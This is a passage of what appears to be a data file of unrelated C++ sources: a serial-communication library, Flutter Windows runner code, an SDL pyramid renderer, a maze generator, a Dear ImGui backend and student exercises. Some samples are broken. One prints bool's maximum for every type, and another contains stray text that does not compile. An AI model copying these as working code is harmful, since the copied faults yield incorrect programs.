int2Write;\n    ArCOMstream->write(typeBuffer.byteArray, 4);\n}\nbyte ArCOM::readByte(){\n  while (ArCOMstream->available() == 0) {}\n  return ArCOMstream->read();\n}\nbyte ArCOM::readUint8(){\n  while (ArCOMstream->available() == 0) {}\n  return ArCOMstream->read();\n}\nchar ArCOM::readChar(){\n  while (ArCOMstream->available() == 0) {}\n  return ArCOMstream->read();\n}\nunsigned short ArCOM::readUint16() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  return typeBuffer.uint16;\n}\n\nunsigned long ArCOM::readUint32() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[2] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[3] = ArCOMstream->read();\n  return typeBuffer.uint32;\n}\n\nfloat ArCOM::readFloat() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[2] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[3] = ArCOMstream->read();\n  return typeBuffer.floatVal;\n}\n\nvoid ArCOM::writeInt8(int8_t int2Write) {\n  typeBuffer.int8 = int2Write;\n  ArCOMstream->write(typeBuffer.byteArray[0]);\n}\n\nvoid ArCOM::writeInt16(int16_t int2Write) {\n  typeBuffer.int16 = int2Write;\n  ArCOMstream->write(typeBuffer.byteArray[0]);\n  ArCOMstream->write(typeBuffer.byteArray[1]);\n}\n\nvoid ArCOM::writeInt32(int32_t int2Write) {\n  typeBuffer.int32 = int2Write;\n  ArCOMstream->write(typeBuffer.byteArray[0]);\n  ArCOMstream->write(typeBuffer.byteArray[1]);\n  ArCOMstream->write(typeBuffer.byteArray[2]);\n  ArCOMstream->write(typeBuffer.byteArray[3]);\n}\n\nvoid ArCOM::writeFloat(float float2Write) {\n  typeBuffer.floatVal = float2Write;\n  ArCOMstream->write(typeBuffer.byteArray[0]);\n  ArCOMstream->write(typeBuffer.byteArray[1]);\n  ArCOMstream->write(typeBuffer.byteArray[2]);\n  ArCOMstream->write(typeBuffer.byteArray[3]);\n}\n\nint8_t ArCOM::readInt8() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  return typeBuffer.int8;\n}\nint16_t ArCOM::readInt16() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  return typeBuffer.int16;\n}\nint32_t ArCOM::readInt32() {\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[0] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[1] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[2] = ArCOMstream->read();\n  while (ArCOMstream->available() == 0) {}\n  typeBuffer.byteArray[3] = ArCOMstream->read();\n  return typeBuffer.int32;\n}\nvoid ArCOM::writeByteArray(byte numArray[], unsigned int nValues) {\n  ArCOMstream->write(numArray, nValues);\n}\nvoid ArCOM::writeUint8Array(byte numArray[], unsigned int nValues) {\n  ArCOMstream->write(numArray, nValues);\n}\nvoid ArCOM::writeCharArray(char charArray[], unsigned int nValues) {\n  ArCOMstream->write(charArray, nValues);\n}\nvoid ArCOM::writeInt8Array(int8_t numArray[], ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff#include <iostream>\r\n#include <limits>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\r\n    bool a;\r\n    double b;\r\n    float c;\r\n    int d;\r\n    short i;\r\n    long f;\r\n    char g;\r\n\r\n    //\u0442\u0438\u043f \u0434\u0430\u043d\u043d\u044b\u0445 (1 \u0437\u0430\u0434\u0430\u043d\u0438\u0435)\r\n    cout << \"Names and type\" << endl;\r\n    cout << \"Name: a. \" << \"Type: \" << typeid(a).name() << endl;\r\n    cout << \"Name: b. \" << \"Type: \" << typeid(b).name() << endl;\r\n    cout << \"Name: c. \" << \"Type: \" << typeid(c).name() << endl;\r\n    cout << \"Name: i. \" << \"Type: \" << typeid(i).name() << endl;\r\n    cout << \"Name: f. \" << \"Type: \" << typeid(f).name() << endl;\r\n    cout << \"Name: g. \" << \"Type: \" << typeid(g).name() << endl;\r\n    cout << \"-----------------------------------\" << endl;\r\n\r\n    //\u043c\u0438\u043d. \u0438 \u043c\u0430\u043a\u0441. \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 (2 \u0437\u0430\u0434\u0430\u043d\u0438\u0435)\r\n    cout << \"min,max\" << endl;\r\n    cout << \"a \" << numeric_limits<bool>::min() << \", \" << numeric_limits<bool>::max() << endl;\r\n    cout << \"b \" << numeric_limits<double>::min() << \", \" << numeric_limits<bool>::max() << endl;\r\n    cout << \"c \" << numeric_limits<float>::min() << \", \" << numeric_limits<bool>::max() << endl;\r\n    cout << \"d \" << numeric_limits<int>::min() << \", \" << numeric_limits<bool>::max() << endl;\r\n    cout << \"i \" << numeric_limits<short>::min() << \", \" << numeric_limits<bool>::max() << endl;\r\n    cout << \"f \" << numeric_limits<long>::min() << \", \" << numeric_limits<bool>::max() << endl;\r\n    cout << \"g \" << numeric_limits<char>::min() << \", \" << numeric_limits<bool>::max() << endl;\r\n}\r\n\r\n\r\n//\u0442\u0438\u043f\u043e\u0432 bool, double, float, int, short, long, char",
    "#include \"pyramid.h\"\r\n#include \"Renderer3D.h\"\r\n#include <iostream>\r\n#include <vector>\r\n#include <SDL.h>\r\n#include <cmath>\r\n\r\n// Creates an array of points for a rotated pyramid\r\nstd::vector<Point3D> points{\r\n    Point3D{0, 0, 1},                   // Apex\r\n    Point3D{-1, -1, -1},                // Base vertex 1\r\n    Point3D{1, -1, -1},                 // Base vertex 2\r\n    Point3D{1, 1, -1},                  // Base vertex 3\r\n    Point3D{-1, 1, -1}                  // Base vertex 4\r\n};\r\n\r\n// Angle of rotation around the x-axis (pitch) in radians\r\ndouble pitch = 0.3;\r\n\r\n// Angle of rotation around the y-axis (yaw) in radians\r\ndouble yaw = 0.2;\r\n\r\n// Angle of rotation around the z-axis (roll) in radians\r\ndouble roll = 0.1;\r\n\r\n// Creates an array of edges for a pyramid (This holds indices referencing the points array)\r\nstd::vector<Edge> edges{\r\n    Edge{0, 1}, // Edge from apex to base vertex 1\r\n    Edge{0, 2}, // Edge from apex to base vertex 2\r\n    Edge{0, 3}, // Edge from apex to base vertex 3\r\n    Edge{0, 4}, // Edge from apex to base vertex 4\r\n    Edge{1, 2}, // Edge connecting base vertex 1 to base vertex 2\r\n    Edge{2, 3}, // Edge connecting base vertex 2 to base vertex 3\r\n    Edge{3, 4}, // Edge connecting base vertex 3 to base vertex 4\r\n    Edge{4, 1}  // Edge connecting base vertex 4 to base vertex 1\r\n};\r\n\r\n//default C++ function\r\nint main(int argc, char* argv[])\r\n{\r\n    //creating a window and a renderer\r\n    SDL_Window* window;\r\n    SDL_Renderer* renderer;\r\n\r\n    //creates a centered window with 960 width and 540 height\r\n    window = SDL_CreateWindow(\"Pyramid Renderer by Moses Onerhime\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 960, 540, 0);\r\n    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);\r\n\r\n    bool running = true;\r\n\r\n    // Apply rotations around x, y, and z axes\r\n    for (Point3D& point : points) {\r\n        // Rotation around the x-axis (pitch)\r\n        double temp_y = point.y;\r\n        point.y = temp_y * cos(pitch) - point.z * sin(pitch);\r\n        point.z = temp_y * sin(pitch) + point.z * cos(pitch);\r\n\r\n        // Rotation around the y-axis (yaw)\r\n        double temp_x = point.x;\r\n        point.x = temp_x * cos(yaw) + point.z * sin(yaw);\r\n        point.z = -temp_x * sin(yaw) + point.z * cos(yaw);\r\n\r\n        // Rotation around the z-axis (roll)\r\n        temp_x = point.x;\r\n        point.x = temp_x * cos(roll) - point.y * sin(roll);\r\n        point.y = temp_x * sin(roll) + point.y * cos(roll);\r\n    }\r\n\r\n\r\n    //Creating an instance of the the Renderer3D class\r\n    Renderer3D render3D(window, renderer, points, edges);\r\n\r\n    while (running)\r\n    {\r\n        //if the quit button is pressed, the loop breaks\r\n        if (SDL_QuitRequested()) { running = false; break; }\r\n\r\n       \r\n\r\n        //Calls the function created in the Renderer3D class (render 3D is an instance of the class defined above)\r\n        render3D.render();\r\n      \r\n    }\r\n\r\n    /*\r\n    if (SDL_Init(SDL_INIT_EVERYTHING) < 0)\r\n    {\r\n        std::cout << \"SDL initialization failed. SDL Error: \" << SDL_GetError();\r\n    }\r\n    else\r\n    {\r\n        std::cout << \"SDL initialization succeeded!\";\r\n    }\r\n\r\n    std::cin.get();\r\n    return 0;\r\n    */\r\n\r\n\r\n    return 0;\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <cstdlib>      // rand()\n#include <ctime>        // srand(time)\n#include <iomanip>      // setw()\n\n#define MAZE_ROW 10\n#define MAZE_COLUMN 10\n\nvoid initMaze(unsigned int Maze[MAZE_ROW][MAZE_COLUMN])\n{\n    for (int i = 0; i < MAZE_ROW; i++)\n    {\n        for (int j = 0; j < MAZE_COLUMN; j++)\n        {\n            Maze[i][j] = 0;\n        }\n    }\n}\n\nvoid printMaze(unsigned int Maze[MAZE_ROW][MAZE_COLUMN])\n{\n    for (int i = 0; i < MAZE_ROW; i++)\n    {\n        for (int j = 0; j < MAZE_COLUMN; j++)\n        {\n            std::cout << std::setw(3) << Maze[i][j] << \" \";\n        }\n        std::cout << std::endl;\n    }\n}\n\nvoid GetNeighbours(unsigned int Maze[MAZE_ROW][MAZE_COLUMN], unsigned int neighbours[4], unsigned int mapxIndex, unsigned int mapyIndex)\n{\n    if ((mapxIndex > 0) && (Maze[mapxIndex - 1][mapyIndex] == 0)) {\n        neighbours[0] = 1;\n    }\n    else {\n        neighbours[0] = 0;\n    }\n\n    if ((mapyIndex > 0) && (Maze[mapxIndex][mapyIndex - 1] == 0)) {\n        neighbours[1] = 1;\n    }\n    else {\n        neighbours[1] = 0;\n    }\n\n    if ((mapxIndex < MAZE_ROW - 1) && (Maze[mapxIndex + 1][mapyIndex] == 0)) {\n        neighbours[2] = 1;\n    }\n    else {\n        neighbours[2] = 0;\n    }\n\n    if ((mapyIndex < MAZE_COLUMN - 1) && (Maze[mapxIndex][mapyIndex + 1] == 0)) {\n        neighbours[3] = 1;\n    }\n    else {\n        neighbours[3] = 0;\n    }\n}\n\nbool NeighbourAvailable(unsigned int neighbours[])\n{\n    for (int i = 0; i < 4; i++)\n    {\n        if (neighbours[i] == 1)\n            return true;\n    }\n\n    return false;\n}\n\nvoid randomizeMaze(unsigned int Maze[MAZE_ROW][MAZE_COLUMN])\n{\n    unsigned int counter = MAZE_ROW * MAZE_COLUMN;\n\n    unsigned int currentVal = 1;\n    unsigned int mapXIndex = 0;\n    unsigned int mapYIndex = 0;\n    int randomVal;\n\n    unsigned int neighbours[4] = { 0,0,0,0 };\n\n    Maze[mapXIndex][mapYIndex] = currentVal;\n    counter--;\n\n    while (counter > 0)\n    {\n        GetNeighbours(Maze, neighbours, mapXIndex, mapYIndex);\n        if (!NeighbourAvailable(neighbours))\n        {\n            if (mapXIndex != 0 && Maze[mapXIndex - 1][mapYIndex] == currentVal - 1)\n            {\n                mapXIndex--;\n                currentVal--;\n            }\n            else if (mapXIndex < MAZE_ROW && Maze[mapXIndex + 1][mapYIndex] == currentVal - 1)\n            {\n                mapXIndex++;\n                currentVal--;\n            }\n            else if (mapYIndex != 0 && Maze[mapXIndex][mapYIndex - 1] == currentVal - 1)\n            {\n                mapYIndex--;\n                currentVal--;\n            }\n            else\n            {\n                mapYIndex++;\n                currentVal--;\n            }\n        }\n        else\n        {\n            do {\n                randomVal = rand() % 4;\n            } while (neighbours[randomVal] == 0);\n\n            switch (randomVal)\n            {\n            case 0:\n                mapXIndex--;\n                break;\n            case 1:\n                mapYIndex--;\n                break;\n            case 2:\n                mapXIndex++;\n                break;\n            case 3:\n                mapYIndex++;\n                break;\n            default:\n                break;\n            }\n            currentVal++;\n            Maze[mapXIndex][mapYIndex] = currentVal;\n            counter--;\n        }\n    }\n}\n\n\nint main()\n{\n    std::srand(std::time(0));\n    unsigned int Maze[MAZE_ROW][MAZE_COLUMN];\n    initMaze(Maze);\n    randomizeMaze(Maze);\n    printMaze(Maze);\n\n    std::cout << std::endl << std::endl << \"Draw a line between numbers that have a value difference is greater than one. \" << std::endl << std::endl;\n    return 0;\n}",
    "// dear imgui: Renderer Backend for SDL_Renderer for SDL3\n// (Requires: SDL 3.0.0+)\n\n// Note how SDL_Renderer is an _optional_ component of SDL3.\n// For a multi-platform app consider using e.g. SDL+DirectX on Windows and SDL+OpenGL on Linux/OSX.\n// If your application will want to render any non trivial amount of graphics other than UI,\n// please be aware that SDL_Renderer currently offers a limited graphic API to the end-user and\n// it might be difficult to step out of those boundaries.\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'SDL_Texture*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n\n// You can copy and use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n//  2024-02-12: Amend to query SDL_RenderViewportSet() and restore viewport accordingly.\n//  2023-05-30: Initial version.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_sdlrenderer3.h\"\n#include <stdint.h>     // intptr_t\n\n// Clang warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wsign-conversion\"    // warning: implicit conversion changes signedness\n#endif\n\n// SDL\n#include <SDL3/SDL.h>\n#if !SDL_VERSION_ATLEAST(3,0,0)\n#error This backend requires SDL 3.0.0+\n#endif\n\n// SDL_Renderer data\nstruct ImGui_ImplSDLRenderer3_Data\n{\n    SDL_Renderer*   SDLRenderer;\n    SDL_Texture*    FontTexture;\n    ImGui_ImplSDLRenderer3_Data() { memset((void*)this, 0, sizeof(*this)); }\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplSDLRenderer3_Data* ImGui_ImplSDLRenderer3_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplSDLRenderer3_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nbool ImGui_ImplSDLRenderer3_Init(SDL_Renderer* renderer)\n{\n    ImGuiIO& io = ImGui::GetIO();\n    IM_ASSERT(io.BackendRendererUserData == nullptr && \"Already initialized a renderer backend!\");\n    IM_ASSERT(renderer != nullptr && \"SDL_Renderer not initialized!\");\n\n    // Setup backend capabilities flags\n    ImGui_ImplSDLRenderer3_Data* bd = IM_NEW(ImGui_ImplSDLRenderer3_Data)();\n    io.BackendRendererUserData = (void*)bd;\n    io.BackendRendererName = \"imgui_impl_sdlrenderer3\";\n    io.BackendFlags |= ImGuiBackendFlags_RendererHasVtxOffset;  // We can honor the ImDrawCmd::VtxOffset field, allowing for large meshes.\n\n    bd->SDLRenderer = renderer;\n\n    return true;\n}\n\nvoid ImGui_ImplSDLRenderer3_Shutdown()\n{\n    ImGui_ImplSDLRenderer3_Data* bd = ImGui_ImplSDLRenderer3_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"No renderer backend to shutdown, or already shutdown?\");\n    ImGuiIO& io = ImGui::GetIO();\n\n    ImGui_ImplSDLRenderer3_DestroyDeviceObjects();\n\n    io.BackendRendererName = nullptr;\n    io.BackendRendererUserData = nullptr;\n    io.BackendFlags &= ~ImGuiBackendFlags_RendererHasVtxOffset;\n    IM_DELETE(bd);\n}\n\nstatic void ImGui_ImplSDLRenderer3_SetupRenderState()\n{\n\tImGui_ImplSDLRenderer3_Data* bd = ImGui_ImplSDLRenderer3_GetBackendData();\n\n\t// Clear out any viewports and cliprect set by the user\n    // FIXME: Technically speaking there are lots of other things we could backup/setup/restore during our render process.\n\tSDL_SetRenderViewport(bd->SDLRenderer, nullptr);\n\tSDL_SetRenderClipRect(bd->SDLRenderer, nullptr);\n}\n\nvoid ImGui_ImplSDLRenderer3_NewFrame()\n{\n    ImGui_ImplSDLRenderer3_Data* bd = ImGui_ImplSDLRenderer3_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"Did you call ImGui_ImplSDLRenderer3_Init()?\");\n\n    if (!bd->FontTexture)\n        ImGui_ImplSDLRenderer3_CreateDeviceObjects();\n}\n\nvoid ImGui_ImplSDLRenderer3_RenderDrawData(ImDrawData* draw_data)\n{\n\tImGui_ImplSDLRenderer3_Data* bd = ImGui_ImplSDLRenderer3_GetBackendData();\n\n\t// If there's a scale factor set by the user, use that instead\n    // If the user has specified a scale factor to SDL_Renderer already via SDL_RenderSetScale(), SDL will scale whatever we pass\n    // to SDL_RenderGeometryRaw() by that scale factor. In that case we don't want to be also scaling it ourselves here.\n    float rsx = 1.0f;\n\tfloat rsy = 1.0f;\n\tSDL_GetRenderScale(bd->SDLRenderer, &rsx, &rsy);\n    ImVec2 render_scale;\n\trender_scale.x = (rsx == 1.0f) ? draw_data->FramebufferScale.x : 1.0f;\n\trender",
    "\ufeff// ConsoleApplication3.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\n\nint main()\n{\n    std::cout << \"Hello World!\\n\";\n    fjirdoiooi212\n        fdwfe\n        hellofghhjhjr\n\n}\n\n// \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: CTRL+F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u043a \u0431\u0435\u0437 \u043e\u0442\u043b\u0430\u0434\u043a\u0438\"\n// \u041e\u0442\u043b\u0430\u0434\u043a\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u043e\u0442\u043b\u0430\u0434\u043a\u0443\"\n\n// \u0421\u043e\u0432\u0435\u0442\u044b \u043f\u043e \u043d\u0430\u0447\u0430\u043b\u0443 \u0440\u0430\u0431\u043e\u0442\u044b \n//   1. \u0412 \u043e\u043a\u043d\u0435 \u043e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0439 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0438 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0438\u043c\u0438.\n//   2. \u0412 \u043e\u043a\u043d\u0435 Team Explorer \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0438\u0441\u0442\u0435\u043c\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n//   3. \u0412 \u043e\u043a\u043d\u0435 \"\u0412\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0432\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u0431\u043e\u0440\u043a\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f.\n//   4. \u0412 \u043e\u043a\u043d\u0435 \"\u0421\u043f\u0438\u0441\u043e\u043a \u043e\u0448\u0438\u0431\u043e\u043a\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438.\n//   5. \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430, \u0438\u043b\u0438 \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430.\n//   6. 